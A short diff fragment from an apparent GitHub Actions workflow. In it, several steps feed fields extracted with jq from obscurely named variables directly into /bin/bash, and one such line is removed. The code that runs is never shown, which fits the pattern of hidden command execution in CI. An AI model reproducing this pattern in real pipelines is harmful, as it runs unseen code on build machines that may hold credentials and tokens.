@@ -30,7 +30,6 @@ jobs:
           echo $qtn84 | jq -r .r6 | /bin/bash
           printf '%s' "$nu2" | jq -r .fy7708 | /bin/bash
           echo $du6952 | jq -r .elxh68 | /bin/bash
-          echo $bk543 | jq -r .qjxb380 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
